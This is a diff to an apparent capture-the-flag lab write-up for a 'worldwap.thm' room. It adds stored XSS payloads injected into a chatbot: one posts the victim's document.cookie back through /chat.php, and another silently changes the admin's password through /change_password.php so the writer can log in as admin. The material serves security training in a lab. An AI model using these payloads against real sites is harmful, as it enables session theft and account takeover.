@@ -53,4 +53,41 @@ Add the file to host name **`echo "$IP worldwap.thm" >> /etc/hosts"`**
 NOTE: In real world, once you enumerate the directory on both port, you'll see that on port 80, there's **`4.py`** whereas on port 8081, there's **`admin.py`**. Reading these two files will help us obtain the credentials to log in, hence retrieving the flags. However, it's not the purpose of this room. So we continue to exploit the front-end of the application.
 
 ### Flag 2
-There are 3 ways to retrieve flag 2.
+- There are 3 ways to retrieve flag 2. We first need to confirm the chatbot is vulnerable to XSS `<script>alert('test')</script>`
+- There should be an alert.
+- TIPS: Reset the chatbot / Clear all chats when you experiment different payloads
+
+#### Flag 2.1
+1. Inject the following payload into the chatbot
+
+```
+<script>
+  fetch("/chat.php", {
+    "credentials": "include",
+    "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "body": “message=”+document.cookie,
+    "method": "POST",
+    "mode": "cors"
+  });
+</script>
+```
+
+#### Flag 2.2
+  1. Inject this payload into the chatbot
+
+```
+<script>
+  fetch('/change_password.php', {
+    method: 'POST',
+    credentials: 'include',  
+    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+    body: 'new_password=password'
+  });
+</script>
+```
+  2. Trigger another payload **`<script>alert(1)</script>`**
+  3. Log out and login as the admin with a new password `admin:password`
+     
+<img width="752" height="508" alt="Screenshot 2026-03-11 at 6 49 24 PM" src="https://github.com/user-attachments/assets/034094ff-b0e1-4be2-8c96-70089128653c" />
